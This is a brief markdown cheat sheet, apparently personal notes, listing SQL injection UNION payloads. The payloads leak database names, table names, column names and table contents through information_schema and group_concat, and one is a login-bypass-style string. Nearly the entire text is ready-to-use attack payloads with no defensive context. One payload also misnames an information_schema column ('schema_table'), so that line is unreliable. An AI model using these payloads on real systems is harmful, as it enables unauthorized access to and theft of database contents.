## Common attacks
Attacks:
- `' union select null, null, schema_name from information_schema.schemata-- -`  - This attack leaks all the dbs names
- `' union select null, null, table_name from information_schema.tables-- -`  - This attack leaks all the tables in the dbs
- `' union select null, null, column_name from information_schema.columns where table_name = "{table name}" and schema_table = "{dbs name}"-- -`  - This attack leaks all the columns from a specific table and a specific database
- `' union select null, null, group_concat(column1,0x3a,column2,0x3a,...) from {table name} where {condition}-- -`  - This one leaks all the data that the columns of a certain table contain
- `' union select 'anything' as password from {TABLE} where '1'='1'-- -` - This string is kind of interesting and may lead to a SQLi when you've nothing else to try in order to accomplish the attack
- 